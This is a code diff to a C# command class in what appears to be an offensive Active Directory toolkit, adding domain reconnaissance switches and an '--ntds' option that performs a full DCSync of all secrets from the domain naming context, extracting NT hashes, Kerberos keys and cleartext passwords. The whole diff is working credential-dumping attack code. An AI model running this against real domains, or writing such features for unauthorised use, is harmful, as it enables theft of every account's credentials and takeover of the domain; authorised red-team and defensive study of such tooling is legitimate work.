@@ -33,6 +33,49 @@ public sealed class DcsyncCommand : Command
 	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
 	public RpcParameterGroup RpcParameters { get; set; } = null!;
 
+	[Parameter]
+	[Alias("dc-info")]
+	[Description("List all domain controllers (DsGetDomainControllerInfo)")]
+	public SwitchParam DcInfo { get; set; }
+
+	[Parameter]
+	[Alias("list-domains")]
+	[Description("List domains in the forest (DsCrackNames)")]
+	public SwitchParam ListDomains { get; set; }
+
+	[Parameter]
+	[Alias("list-sites")]
+	[Description("List sites in the forest (DsCrackNames)")]
+	public SwitchParam ListSites { get; set; }
+
+	[Parameter]
+	[Alias("list-roles")]
+	[Description("List FSMO role owners (DsCrackNames)")]
+	public SwitchParam ListRoles { get; set; }
+
+	[Parameter]
+	[Alias("list-partitions")]
+	[Description("List naming contexts/partitions (DsCrackNames)")]
+	public SwitchParam ListPartitions { get; set; }
+
+	[Parameter]
+	[Alias("list-gcs")]
+	[Description("List global catalog servers (DsCrackNames)")]
+	public SwitchParam ListGcs { get; set; }
+
+	[Parameter]
+	[Description("Show inbound/outbound replication neighbors (DsReplicaGetInfo)")]
+	public SwitchParam Neighbors { get; set; }
+
+	[Parameter]
+	[Alias("crack-name")]
+	[Description("Resolve a name via DsCrackNames (auto-detects SID/GUID/DN/UPN/SAM)")]
+	public string? CrackName { get; set; }
+
+	[Parameter]
+	[Description("Replicate ALL secrets from the domain NC (full DCSync, NetExec --ntds drsuapi)")]
+	public SwitchParam Ntds { get; set; }
+
 	private static readonly string[] DefaultAttrNames =
 	[
 		nameof(LdapAttributeTypes.SAMAccountName),
@@ -105,11 +148,30 @@ public sealed class DcsyncCommand : Command
 		var dcInfo = dcInfos[0];
 		AtlasConsole.Info($"{this.ServerName}:135", $"domain: {userDomain} - dc: {dcInfo.DnsHostName}");
 
-		var specs = (this.ObjectSpecs is null || this.ObjectSpecs.Length == 0)
-			? new[] { "krbtgt" }
-			: this.ObjectSpecs.SelectMany(s => s.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries));
+		bool hasTopology = this.DcInfo.IsSet || this.ListDomains.IsSet || this.ListSites.IsSet || this.ListRoles.IsSet
+			|| this.ListPartitions.IsSet || this.ListGcs.IsSet || this.Neighbors.IsSet || this.CrackName is not null;
+		if (hasTopology)
+			await this.RunTopologyAsync(dsbind, dcInfos, cancellationToken).ConfigureAwait(false);
+
+		bool explicitObjects = this.ObjectSpecs is not null && this.ObjectSpecs.Length > 0;
+		if (hasTopology && !explicitObjects && !this.Ntds.IsSet)
+			return 0;
 
 		List<DsName> names = new List<DsName>();
+		ExtendedOpRequest exop = ExtendedOpRequest.ReplObject;
+		if (this.Ntds.IsSet)
+		{
+			var ncDn = await this.GetDomainNcDnAsync(cancellationToken).ConfigureAwait(false);
+			names.Add(new DsName(Guid.Empty, null, ncDn));
+			exop = 0; // full-NC REPL_SECRET sync (Titanis ReplicateNcCommand)
+			AtlasConsole.Info($"{this.ServerName}:135", $"--ntds: replicating all secrets from {ncDn}");
+		}
+		else
+		{
+			var specs = (!explicitObjects)
+				? new[] { "krbtgt" }
+				: this.ObjectSpecs.SelectMany(s => s.Split(',', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries));
+
 		List<string> filters = new List<string>();
 		foreach (var spec in specs)
 		{
@@ -136,6 +198,7 @@ public sealed class DcsyncCommand : Command
 			await foreach (var dn in this.ResolveFilterAsync(filter, cancellationToken).ConfigureAwait(false))
 				names.Add(dn);
 		}
+		} // end non-Ntds spec parsing
 
 		if (names.Count == 0)
 		{
@@ -153,11 +216,81 @@ public sealed class DcsyncCommand : Command
 			new UsnVector(),
 			new DcsyncCallback(this.ServerName),
 			1,
-			ExtendedOpRequest.ReplObject,
+			exop,
 			cancellationToken).ConfigureAwait(false);
 
 		AtlasConsole.Info($"{this.ServerName}:135", $"dcsync complete (USN vector: {Convert.ToHexString(usnvec.ToBytes())})");
 		return 0;
+	}
+
+	private async Task RunTopologyAsync(DsBinding dsbind, DomainControllerInfo[] dcInfos, CancellationToken cancellationToken)
+	{
+		if (this.DcInfo.IsSet)
+		{
+			foreach (var dc in dcInfos)
+				AtlasConsole.Success($"{this.ServerName}:135", $"dc: {dc.DnsHostName} site={dc.SiteName} pdc={dc.IsPdc} gc={dc.IsGc} ds={dc.IsDsEnabled}");
+			AtlasConsole.Info($"{this.ServerName}:135", $"--dc-info: {dcInfos.Length} DC(s)");
+		}
+		if (this.ListDomains.IsSet)
+		{
+			var names = await dsbind.GetDomains(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
+			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"domain: {n}");
+			AtlasConsole.Info($"{this.ServerName}:135", $"--list-domains: {names.Length} domain(s)");
+		}
+		if (this.ListSites.IsSet)
+		{
+			var names = await dsbind.GetSites(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
+			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"site: {n}");
+			AtlasConsole.Info($"{this.ServerName}:135", $"--list-sites: {names.Length} site(s)");
+		}
+		if (this.ListRoles.IsSet)
+		{
+			var names = await dsbind.GetRoles(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
+			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"role owner: {n}");
+			AtlasConsole.Info($"{this.ServerName}:135", $"--list-roles: {names.Length} role(s)");
+		}
+		if (this.ListPartitions.IsSet)
+		{
+			var names = await dsbind.GetPartitions(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
+			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"partition: {n}");
+			AtlasConsole.Info($"{this.ServerName}:135", $"--list-partitions: {names.Length} partition(s)");
+		}
+		if (this.ListGcs.IsSet)
+		{
+			var names = await dsbind.GetGlobalCatalogServers(DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
+			foreach (var n in names) AtlasConsole.Success($"{this.ServerName}:135", $"gc: {n}");
+			AtlasConsole.Info($"{this.ServerName}:135", $"--list-gcs: {names.Length} GC(s)");
+		}
+		if (this.Neighbors.IsSet)
+		{
+			var from = await dsbind.GetRepsFromNeighbors(null, cancellationToken).ConfigureAwait(false);
+			foreach (var n in from)
+				AtlasConsole.Success($"{this.ServerName}:135", $"reps-from: nc={n.NamingContext} dsa={n.NeighborDsaAddress} lastSuccess={n.LastSyncSuccessTime:yyyy-MM-dd HH:mm:ss} result={n.LastSyncResult}");
+			var to = await dsbind.GetRepsToNeighbors(null, cancellationToken).ConfigureAwait(false);
+			foreach (var n in to)
+				AtlasConsole.Success($"{this.ServerName}:135", $"repsto: nc={n.NamingContext} dsa={n.NeighborDsaAddress}");
+			AtlasConsole.Info($"{this.ServerName}:135", $"--neighbors: {from.Length} inbound, {to.Length} outbound");
+		}
+		if (this.CrackName is not null)
+		{
+			string name = this.CrackName;
+			DsCrackNameFormat offered = DsCrackNameFormat.SamAccountNameSansDomain;
+			if (name.StartsWith("S-1-", StringComparison.OrdinalIgnoreCase)) offered = DsCrackNameFormat.SidOrSidHistory;
+			else if (Guid.TryParse(name.Trim('{', '}'), out _)) offered = DsCrackNameFormat.UniqueIdName;
+			else if (name.Contains('=')) offered = DsCrackNameFormat.Fqdn1779;
+			else if (name.Contains('@')) offered = DsCrackNameFormat.UserPrincipalName;
+			var cracked = await dsbind.CrackName(name, offered, DsCrackNameResultFormat.Fqdn1779, cancellationToken).ConfigureAwait(false);
+			foreach (var c in cracked) AtlasConsole.Success($"{this.ServerName}:135", $"cracked ({offered}): {c}");
+			if (cracked.Length == 0) AtlasConsole.Info($"{this.ServerName}:135", $"--crack-name: no result for '{name}'");
+		}
+	}
+
+	private async Task<LdapDistinguishedName> GetDomainNcDnAsync(CancellationToken cancellationToken)
+	{
+		LdapClient ldap = await ConnectLdapAsync(this.ServerName, cancellationToken).ConfigureAwait(false);
+		if (ldap.DomainRoot is null)
+			throw new InvalidOperationException("Cannot determine domain naming context");
+		return ldap.DomainRoot;
 	}
 
 	private static string[] BuildAttrOids()
@@ -171,7 +304,9 @@ public sealed class DcsyncCommand : Command
 			{
 				oids.Add(attr.Oid);
 			}
-			else if (name is "KERBEROSKEYS" or "KERBEROSOLDKEYS" or "CLEARTEXTPASSWORD")
+			else if (name.Equals("KERBEROSKEYS", StringComparison.OrdinalIgnoreCase)
+				|| name.Equals("KERBEROSOLDKEYS", StringComparison.OrdinalIgnoreCase)
+				|| name.Equals("CLEARTEXTPASSWORD", StringComparison.OrdinalIgnoreCase))
 			{
 				wantsSuppCreds = true;
 			}
@@ -252,6 +387,7 @@ public sealed class DcsyncCommand : Command
 			string user = (entry[LdapAttributeTypes.SAMAccountName]?.Value as string)
 				?? entry.EntryName?.ToString()
 				?? "(unknown)";
+			AtlasConsole.Info($"{host}:445", $"dcsync: replicated {user} ({obj.Attributes.Length} attr(s))");
 
 			if (entry[LdapAttributeTypes.UnicodePwd]?.Value is byte[] ntHash)
 			{
